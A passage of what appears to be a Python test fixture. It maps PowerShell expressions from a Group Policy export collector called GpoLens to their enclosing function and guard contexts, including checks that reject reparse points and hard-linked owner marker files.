                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "finally",
                "if ($zip) after []",
            ),
        ),
        (
            "[guid]::NewGuid().ToString('N')",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "[guid]::NewGuid()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "$newest.BaseName.Substring(0, $newest.BaseName.Length - 16)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            (
                "[string]::Equals($_.BaseName.Substring(0, $_.BaseName.Length - 16), "
                "$producerPrefix, [StringComparison]::Ordinal)"
            ),
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$_.BaseName.Substring(0, $_.BaseName.Length - 16)",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$lock.Dispose()",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "finally",
            ),
        ),
        (
            "$line.Length",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "(Get-Item -LiteralPath $LogPath).Length",
            (
                "function Write-GpoLensCollectionLog",
                "if-condition after []",
            ),
        ),
        (
            "$_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.BaseName.Length",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$_.BaseName",
            (
                "function Get-GpoLensCompletedExports",
                "scriptblock in CommandExpressionAst",
            ),
        ),
        (
            "$archive.FullName",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
            ),
        ),
        (
            "$archive.Name",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "try",
                "else of [($zip.GetEntry('AllGPOs.xml'))]",
            ),
        ),
        (
            "$archive.Name",
            (
                "function Get-GpoLensCompletedExports",
                "foreach ($archive in $candidates)",
                "catch []",
            ),
        ),
        (
            "$pending.Count",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
            ),
        ),
        (
            "$item.Attributes",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileAttributes]::ReparsePoint",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "if-condition after []",
            ),
        ),
        (
            "$child.Attributes",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileAttributes]::ReparsePoint",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
                "if-condition after []",
            ),
        ),
        (
            "$child.PSIsContainer",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
                "guard if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "if-condition after []",
            ),
        ),
        (
            "$child.FullName",
            (
                "function Assert-GpoLensRegularTree",
                "While ($pending.Count -gt 0)",
                "guard if ($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "foreach ($child in @(Get-ChildItem -LiteralPath $directory -Force))",
                "guard if ($child.Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw",
                "if ($child.PSIsContainer) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
            ),
        ),
        (
            "[StringComparison]::OrdinalIgnoreCase",
            (
                "function Assert-GpoLensCollectionOwner",
                "guard if (-not (Test-Path -LiteralPath $marker -PathType Leaf)) -> throw",
                "if-condition after []",
            ),
        ),
        (
            "(Get-Item -LiteralPath $OutputRoot -Force).Attributes",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileAttributes]::ReparsePoint",
            (
                "function Invoke-GpoLensCollection",
                "if-condition after []",
            ),
        ),
        (
            "[IO.FileMode]::OpenOrCreate",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "[IO.FileAccess]::ReadWrite",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "[IO.FileShare]::None",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "(Resolve-Path -LiteralPath $InventoryPath).ProviderPath",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[Text.Encoding]::UTF8",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
            ),
        ),
        (
            "[guid]::Empty",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
            ),
        ),
        (
            "$entry.Id",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
                "if-condition after []",
            ),
        ),
        (
            "[guid]::Empty",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($InventoryPath) after []",
                "guard if (-not $inventory) -> throw",
                "foreach ($entry in @($inventory))",
                "if-condition after []",
            ),
        ),
        (
            "$_.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of ForEach-Object",
            ),
        ),
        (
            "$_.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$created.Count",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if-condition after []",
            ),
        ),
        (
            "$created.Count",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "if ($created.Count -ne 1) after []",
            ),
        ),
        (
            "$newest.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
            ),
        ),
        (
            "$newest.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
            ),
        ),
        (
            "$inventoryBytes.Length",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "try",
                "guard if (-not $zip.GetEntry('AllGPOs.xml')) -> throw",
                "if ($InventoryPath) after []",
                "try",
            ),
        ),
        (
            "$newest.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "catch []",
            ),
        ),
        (
            "$newest.Name",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
            ),
        ),
        (
            "$newest.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "if ($CopyTo) after []",
                "try",
            ),
        ),
        (
            "$newest.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "$newest.BaseName.Length",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "$newest.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "$_.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$_.BaseName.Length",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$_.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "[StringComparison]::Ordinal",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "scriptblock positional of Where-Object",
            ),
        ),
        (
            "$archive.BaseName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
            ),
        ),
        (
            "$archive.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "foreach ($archive in $expired)",
                "guard Assert-GpoLensRegularTree -Root $folder",
            ),
        ),
        (
            "$newest.Name",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "$newest.FullName",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "try",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "guard if ($created.Count -ne 1) -> throw",
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
            ),
        ),
        (
            "$failure.Exception.Message",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "try",
            ),
        ),
        (
            "$failure.Exception",
            (
                "function Invoke-GpoLensCollection",
                (
                    "guard if ((Test-Path -LiteralPath $OutputRoot) -and ((Get-Item "
                    "-LiteralPath $OutputRoot -Force).Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
                "guard Assert-GpoLensCollectionOwner -OutputRoot $OutputRoot -TaskName $TaskName",
                "catch []",
                "try",
            ),
        ),
        (
            "$MyInvocation.InvocationName",
            ("if-condition after []",),
        ),
        (
            "$_.Exception.Message",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "catch []",
            ),
        ),
        (
            "$_.Exception",
            (
                "if ($MyInvocation.InvocationName -ne '.') after []",
                "catch []",
            ),
        ),
    ),
    "GpoLensCollectionMarker.ps1": (
        (
            "Get-Item -LiteralPath $Marker -Force -ErrorAction Stop",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                "if-condition after []",
            ),
        ),
        (
            (
                "Add-Type -TypeDefinition @' using System; using System.ComponentModel; using "
                "System.Runtime.InteropServices; using Microsoft.Win32.SafeHandles; namespace "
                "GpoLens { public static class MarkerFileInfo { "
                "[StructLayout(LayoutKind.Sequential)] private struct FileInfo { public uint "
                "Attributes; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "CreationTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "LastAccessTime; public System.Runtime.InteropServices.ComTypes.FILETIME "
                "LastWriteTime; public uint VolumeSerialNumber; public uint FileSizeHigh; "
                "public uint FileSizeLow; public uint NumberOfLinks; public uint "
                'FileIndexHigh; public uint FileIndexLow; } [DllImport("kernel32.dll", '
                "SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static "
                "extern bool GetFileInformationByHandle(SafeFileHandle handle, out FileInfo "
                "info); public static uint LinkCount(SafeFileHandle handle) { FileInfo info; "
                "if (!GetFileInformationByHandle(handle, out info)) throw new "
                "Win32Exception(Marshal.GetLastWin32Error()); if ((info.Attributes & 0x400) != "
                '0) throw new InvalidOperationException("Collection refuses a linked owner '
                "marker.\"); return info.NumberOfLinks; } } } '@ -ErrorAction Stop"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
                "if (-not ('GpoLens.MarkerFileInfo' -as [type])) after []",
            ),
        ),
        (
            "Test-Path -LiteralPath $opened",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "if-condition after []",
            ),
        ),
        (
            "& stat -L --format=%h -- $opened 2>$null",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "else of [([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT)]",
                "guard if (-not (Test-Path -LiteralPath $opened)) -> throw",
            ),
        ),
        (
            "Get-Item -LiteralPath $OutputRoot -Force -ErrorAction Stop",
            ("function Write-GpoLensOwnerMarkerBytes",),
        ),
        (
            "Join-Path $root.FullName '.gpo-lens-collection-owner'",
            (
                "function Write-GpoLensOwnerMarkerBytes",
                (
                    "guard if (-not $root.PSIsContainer -or ($root.Attributes -band "
                    "[IO.FileAttributes]::ReparsePoint)) -> throw"
                ),
            ),
        ),
        (
            (
                "[IO.File]::Open($Marker, [IO.FileMode]::Open, [IO.FileAccess]::Read, "
                "[IO.FileShare]::Read)"
            ),
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
            ),
        ),
        (
            "[GpoLens.MarkerFileInfo]::LinkCount($stream.SafeFileHandle)",
            (
                "function Read-GpoLensOwnerMarkerBytes",
                (
                    "guard if ((Get-Item -LiteralPath $Marker -Force -ErrorAction "
                    "Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) -> throw"
                ),
                "try",
                "if ([Environment]::OSVersion.Platform -eq [PlatformID]::Win32NT) after []",
            ),
        ),
        (
